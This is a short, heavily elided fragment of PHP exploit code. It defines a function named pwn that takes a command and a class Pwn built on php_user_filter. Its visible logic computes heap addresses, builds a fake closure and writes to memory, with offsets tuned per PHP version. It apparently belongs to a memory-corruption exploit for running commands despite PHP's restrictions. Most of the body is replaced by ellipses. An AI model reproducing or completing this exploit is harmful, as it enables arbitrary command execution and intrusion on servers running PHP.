<?php
header("Aizawa-Type: http_aizawa_ninja_filter");
...
function pwn($cmd)
{
    ...
    define(
        "CHUNK_SIZE",
        ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE
    );
...
class Pwn extends php_user_filter
{
    ...
    private function go()
    {
        ...
        $this->helper_addr =
            $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        ...
        $fake_closure_addr =
            $this->helper_addr + $fake_closure_off - $this->helper_off;
    ...
    private function prepare_cleanup($binary_leak)
    {
        ...
        $this->write(
            0,
            $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60)
        );
